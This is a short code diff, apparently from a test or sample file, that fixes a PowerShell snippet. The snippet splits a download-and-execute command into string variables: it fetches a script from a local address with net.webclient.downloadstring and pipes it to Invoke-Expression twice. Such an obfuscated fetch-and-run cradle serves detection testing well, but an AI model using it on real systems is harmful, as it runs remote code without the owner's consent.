@@ -13,7 +13,7 @@ $var1 = '(new-object net.webclient).'
 $var2 = 'downloadstring'
 $var3 = "('http://127.0.0.1:9999/test.ps1')"
 
-$boom =  $var1 + $var2 + $var4 
+$boom =  $var1 + $var2 + $var3
 $boomboom = $boom | IEX
 $boomboom | IEX
 ''')
